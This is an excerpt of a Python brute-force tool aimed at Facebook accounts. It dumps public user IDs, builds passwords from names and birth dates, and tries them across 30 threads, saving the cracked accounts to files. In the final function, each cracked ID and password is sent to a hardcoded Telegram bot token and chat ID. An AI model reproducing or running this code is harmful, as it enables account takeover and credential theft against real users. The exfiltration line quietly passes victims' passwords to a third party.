...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Saw4x/1337v/blob/main/SAW-MOBIL.txt').text
...
def banner():
	...
	print("%s         ░  ░  ░ ░     ░         ░   "%(Z))
	print("%s             ░                       "%(Z))
	print("%s       META MULTI BRUTEFORCE FACEBOOK BY AHMAD"%(Z))
	
# VALIDASI TOKEN
def login():
	try:
		token = open('.AHHMAD.txt','r').read()
		cok = open('.AHMAD.txt','r').read()
...
def login_lagi334():
	try:
		...
		ken = open(".AHHMAD.txt", "w").write(tok)
		cok = open(".AHMAD.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .AHHMAD.txt")
		os.system("rm -f .AHMAD.txt")
...
def AHMAD(my_name):
	...
	banner()
	print(' ')
	print(f' {H}[1]PUBLIG CLONING')
	print(f' {K}[2]RANDOM UID CRACK')
	print(f' {H}[3]FILE UID CRACK')
	print(f' {K}[4]CHEK CRACK HISTORY')
	print(f' {O}[0]EXIT COOK..\n')
	...
	if opt =='1':
	    ...
	    os.system('rm -rf .AHHMAD.txt')
	    os.system('rm -rf .AHMAD.txt')
	    print(x+'['+h+'•'+x+'] WAIT • • •')
	    time.sleep(1)
	    print(' SUCCESS OUT')
	    exit()
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/AHMAD-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def dump_massal():
	...
	try:
		print(f' {H}\n')
		jum = int(input(' HOW MANI ID YOU WONT TO CRACK?'))
	except ValueError:
		print(f' {H}WRONG PRESS TRY ANOTHER {N}\n')
		exit()
	if jum<1 or jum>100:
		print('START DUMB ID ')
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input(' INPUT PUBLIG UID  '+str(yz)+' > ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f' TOTAL ID CLONIED = {k}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('╰─> Sinyal Anda Kurang Bagus Nih !')
		...
		back()
def setting():
	print(f' {H}[1]OLD CLONE')
	print(f' {H}[2]NEW CLONE')
	print(f' {H}[3]RANDOM CLONE')
	hu = input(f'{B} CHOOSE : {H}')
	print('')
	if hu in ['1','01']:
	...
	su()
def su():
	print(f' {H}[1]NAME DIGT')
	print(f' {H}[2]NAME BIRTH')
	print(f' {H}[3]RANDOM PASS')
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		passwrd()
	elif opt =='2':
		...
		passwrd()
def passwrd():
	print(f' {K}PROGRES HASS BEN STARTS')
	print(f' {O}GIVE ME FIDBAK AFTER COMPLIT')
	print(f' ALL {h}OK{x} ID SAVE IN : {h}OK/%s {x}'%(okc))
	print(f'ALL  {k}CP{x} ID SAVE IN : {k}CP/%s {x}'%(cpc))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print(f'{O} CRACK COMPLIT  ')
	print(f'{m}∆{h} OK : {h}%s '%(ok))
	print(f'{m}∆{k} CP : {k}%s{x} '%(cp))
def fast():
	print(f' {K}')
	print(f' {K}PROGRES HASS BEN STARTS')
	print(f' {O}GIVE ME FIDBAK AFTER COMPLIT')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get(f"https://api.telegram.org/bot6139902259:AAGpIL6USYXAKHGWTnigKpmuIEEr8GAvn50/sendMessage?chat_id=1241956273&text=\n{idf}|{pw} ")
